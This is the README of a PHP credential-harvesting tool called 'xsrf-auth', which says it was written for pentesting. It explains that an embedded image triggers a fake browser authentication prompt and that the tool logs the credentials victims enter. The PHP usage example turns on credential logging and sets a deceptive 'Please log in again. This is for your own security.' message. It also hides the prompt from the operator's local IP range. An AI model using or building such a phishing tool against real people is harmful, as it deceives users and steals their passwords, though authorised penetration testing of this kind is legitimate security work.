xsrf-auth
=========

Shows a WWW-Authenticate message on embedded image and saves user credentials to logfile. Originally written for pentest.


Example: 



require_once('imgauth.lib.php');

$auth = new imgauth;

//log user credentials
$auth->enable_log = true;

//message shown to the victim
$auth->message = "Please log in again. This is for your own security.";

//if accessed by these ip's, just display image
$auth->disable_pattern = "/^192\.168\.178.+$/";

//execute
$auth->exec();
